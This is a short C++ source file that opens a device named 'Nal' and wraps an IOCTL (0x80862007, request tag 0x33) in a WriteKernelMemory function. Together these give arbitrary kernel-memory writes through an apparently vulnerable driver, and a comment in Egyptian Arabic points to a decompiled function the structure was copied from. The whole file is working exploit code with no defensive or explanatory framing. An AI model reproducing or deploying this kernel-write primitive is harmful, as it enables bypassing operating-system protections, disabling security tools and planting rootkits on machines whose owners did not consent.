#include "driver_comm.h"

HANDLE g_hDriver = INVALID_HANDLE_VALUE;

bool OpenDriverDevice() {
    g_hDriver = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    return g_hDriver != INVALID_HANDLE_VALUE;
}

bool SendIOCTL(DWORD IoControlCode, PVOID InputBuffer, DWORD InputSize, PVOID OutputBuffer, DWORD OutputSize) {
    if (g_hDriver == INVALID_HANDLE_VALUE) return false;
    DWORD bytesReturned = 0;
    return DeviceIoControl(g_hDriver, IoControlCode, InputBuffer, InputSize, OutputBuffer, OutputSize, &bytesReturned, NULL);
}

bool WriteKernelMemory(PVOID Address, PVOID Buffer, SIZE_T Size) {
    // البنية دي زي اللي كانت في FUN_140027f60 (0x33)
    typedef struct {
        DWORD Magic;       // 0x33
        PVOID TargetAddress;
        PVOID SourceBuffer;
        SIZE_T Size;
    } KERNEL_RW_REQUEST;

    KERNEL_RW_REQUEST req = { 0x33, Address, Buffer, Size };
    return SendIOCTL(0x80862007, &req, sizeof(req), NULL, 0);
}

void CloseDriverDevice() {
    if (g_hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hDriver);
        g_hDriver = INVALID_HANDLE_VALUE;
    }
}